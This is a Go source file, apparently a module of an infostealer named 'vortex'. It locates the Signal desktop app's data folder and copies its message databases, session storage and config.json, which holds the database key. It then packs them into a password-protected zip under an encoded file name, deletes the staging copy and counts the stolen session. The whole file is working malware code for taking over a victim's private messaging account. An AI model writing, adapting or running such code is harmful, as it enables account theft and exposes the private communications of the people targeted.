package messenger

import (
	"os"
	"path/filepath"
	"vortex/encrypt"
	"vortex/hutil"
)

func GetSignalSession(mainFolder string) error {

	signalSession := filepath.Join(os.Getenv("APPDATA"), "Signal")
	signalDumpPath := filepath.Join(mainFolder, "signal-files")
	sessionDirs := []string{"databases", "Session Storage", "Local Storage", "sql"}

	if _, err := os.Stat(signalSession); os.IsNotExist(err) {
		return nil
	}

	for i := range sessionDirs {
		if err := hutil.CopyFolder(filepath.Join(signalSession, sessionDirs[i]), filepath.Join(signalDumpPath, sessionDirs[i])); err != nil {
			return err
		}
	}

	if err := hutil.CopyFile(filepath.Join(signalSession, "config.json"), filepath.Join(signalDumpPath, "config.json")); err != nil {
		return err
	}

	if err := hutil.ZipFolder("signal-files", signalDumpPath, filepath.Join(mainFolder, encrypt.B64Util("messenger-signal-dump.zip", 0)), "LOCK"); err != nil {
		return err
	}

	if err := os.RemoveAll(signalDumpPath); err != nil {
		return err
	}

	hutil.Sessions++

	return nil
}
